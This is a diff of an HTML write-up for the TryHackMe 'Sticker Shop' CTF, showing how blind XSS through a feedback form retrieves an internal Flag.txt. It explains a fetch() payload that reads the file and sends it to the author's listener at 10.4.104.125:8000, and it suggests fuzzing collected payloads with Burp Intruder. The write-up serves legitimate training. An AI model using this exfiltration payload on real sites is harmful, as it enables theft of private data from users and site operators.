@@ -1,28 +1,27 @@
-<h1 class="heading">The Sticker Shop CTF (TryHackMe) </h1>
-<hr>
+<h1 class="heading">The Sticker Shop CTF (TryHackMe) </h1><br></br>
 
 <p class="hero-sub" ">This was somewhat of a easy box on TryHackMe but a great one to start to understand the power of XSS."</p>
-<img class="hero-img" src="pages/Challenge.png"/><br>
-<hr>
+<img class="hero-img" src="pages/Challenge.png"/><br></br>
+
 
 <p class="hero-sub" ">When trying to go to that URL we see a "401 Unauthorized" Error."</p>
-<img class="hero-img" src="pages/unauth.png"/><br>
+<img class="hero-img" src="pages/unauth.png"/><br></br>
 
 <p class="hero-sub" ">So that did not work, But lets poke around at the website without the Flag.txt and see what we can find."</p>
-<img class="hero-img" src="pages/Catpage.png"/><br>
+<img class="hero-img" src="pages/Catpage.png"/><br></br>
 
 <p class="hero-sub" ">Removing Flag.txt from the URL gives us the following page. Our Job now is to poke around the website and see if we find anything interesting we can exploit. We see at the Top of the page "FeedBack" and often times in the description of CTFs you will get clues about where to look. This CTF said, they were using the same computer to read reviews as they used hosting the web page.. so lets look at FeedBack page. "</p>
-<img class="hero-img" src="pages/Form.png"/><br>
+<img class="hero-img" src="pages/Form.png"/><br></br>
 
 <p class="hero-sub" ">Now that we found a form we can start testing out different inputs to see what error messages or responses we get from the WebServer.. or WAF .. Or what ever else may be in the way. For this I open up Burp Suite, To see what is being sent using this form."</p>
-<img class="hero-img" src="pages/Burppage.png"/><br>
+<img class="hero-img" src="pages/Burppage.png"/><br></br>
 
 <p class="hero-sub" ">While Looking at the request field we sent to the server with Burp we notice the Field is labeled "FeedBack".  I tested a few XSS payloads and found that I can get the server to reach out with a script src payload. I created a simple python server to try and reach back to. "</p>
 <img class="hero-img" src="pages/Form2.png"/>
-<img class="hero-img" src="pages/PythonServer.png"/><br>
+<img class="hero-img" src="pages/PythonServer.png"/><br></br>
 
 <p class="hero-sub" ">As shown above it reaches back to my server simple python server. If you are not familiar with XSS payloads. Using Google and Github, you can find many many different kinds. You can put them in a text file and test them all against that same form using Burp Suite Intruder. "</p>
-<p class="hero-sub" ">After testing out a few different payloads and methods, I found one that works for our needs. We want to view Flag.txt from the internal site."</p><br>
+<p class="hero-sub" ">After testing out a few different payloads and methods, I found one that works for our needs. We want to view Flag.txt from the internal site."</p><br></br>
 
 <img class="hero-img" src="pages/Form3.png"/>
 <p class="hero-sub" ">We will break down the above XSS Snippet. "</p>
@@ -30,7 +29,7 @@
 <p class="hero-sub" ">.then(response => response.text()) — Waits for the HTTP response and reads the response."</p>
 <p class="hero-sub" ">.then(data => { ... }) — Once the text is available, runs the function with that text in the variable data."</p>
 <p class="hero-sub" ">Wfetch('http://10.4.104.125:8000/?flag= + encodeURIComponent(data)); — Sends the retrieved text to a remote server by making another GET request to 10.4.104.125:8000, including the text as the URL parameter flag (safely encoded with encodeURIComponent to ensure the data is URL-friendly)."</p>
-<p class="hero-sub" ">The response from my simple python server shows the flag encoded."</p><br>
+<p class="hero-sub" ">The response from my simple python server shows the flag encoded."</p><br></br>
 <img class="hero-img" src="pages/PythonServerFlag.png"/>
 <p class="hero-sub" ">If we decode code it using Burp Suite.. . We get the flag using XSS."</p>
-<img class="hero-img" src="pages/Flagdecoded.png"/><br>
+<img class="hero-img" src="pages/Flagdecoded.png"/><br></br>
